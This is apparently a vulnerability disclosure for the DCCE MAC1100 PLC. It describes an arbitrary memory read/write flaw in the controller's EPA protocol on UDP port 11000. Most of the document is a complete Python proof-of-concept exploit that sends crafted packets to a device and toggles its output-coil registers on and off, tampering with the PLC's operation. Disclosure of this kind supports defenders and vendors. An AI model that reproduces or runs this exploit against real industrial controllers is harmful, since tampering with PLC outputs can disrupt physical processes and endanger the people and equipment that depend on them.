# Dut Computer Control Engineering Co., Ltd

## Edition :

（Dut Computer Control Engineering Co., Ltd ） DCCE MAC1100 PLC

## Location

Taking the value of the tampering Q area as an example, the attack payload is constructed as follows

![](https://i.loli.net/2019/03/20/5c91aee3e2c96.jpg)

### Harm

Memory arbitrary read and write vulnerability
Allows the attacker to remotely tamper with the registers.

### Cause the cause

The MAC1100 PLC communicates on the 11000 port using the EPA protocol. The variable identification area of the EPA protocol represents the variable area accessed. Eighteen variable areas can be accessed through the EPA protocol, such as the I zone (input coil zone) and the Q zone (output coil zone).  V area (user variable area), L area (local variable area), M area (memory variable area), SM area (special function area), and the like.
We can arbitrarily write and tamper with the contents of a variable area. The attacker can construct a malicious data packet to read and write the value of the output coil arbitrarily, which affects the normal operation of the PLC.

## poc

```
#!/usr/bin/python
# -*- coding:utf-8 -*-
import socket
import struct
import time
packet_write1  =['\x0d']
packet_write1 +=['\x00\x3c\xb3']
packet_write1 +=['\x11\x00']
packet_write1 +=['\x01\x00']
packet_write1 +=['\x00\x00']
packet_write1 +=['\x66\x00']
packet_write1 +=['\x01\x00']
packet_write1 +=['\x01\x00']
packet_write1 +=['\x01']

packet_write0  =['\x0d']
packet_write0 +=['\x00\x3c\xb3']
packet_write0 +=['\x11\x00']
packet_write0 +=['\x01\x00']
packet_write0 +=['\x00\x00']
packet_write0 +=['\x66\x00']
packet_write0 +=['\x01\x00']
packet_write0 +=['\x01\x00']
packet_write0 +=['\x00']
#print(packet_read)
#temper any register value!
def send_packet(magic_message):
    sender = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    try:
        sender.sendto(magic_message,("192.168.1.181",11000))
        request = sender.recvfrom(1024)
        print request
    except:
        pass

def temper_Reg_Valve_To_One():
    for i in range(5,15):
        packet_write1[7] = struct.pack("H", i)
        packet = "".join(packet_write1)
        print   [hex(ord(i)) for i in packet]
        send_packet(packet)

def temper_Reg_Valve_To_Zero():
    for i in range(5,15):
        packet_write0[7] = struct.pack("H", i)

        packet = "".join(packet_write0)
        print   [hex(ord(i)) for i in packet]
        send_packet(packet)

if __name__ == '__main__':
    temper_Reg_Valve_To_One()
    time.sleep(5)
    temper_Reg_Valve_To_Zero()
```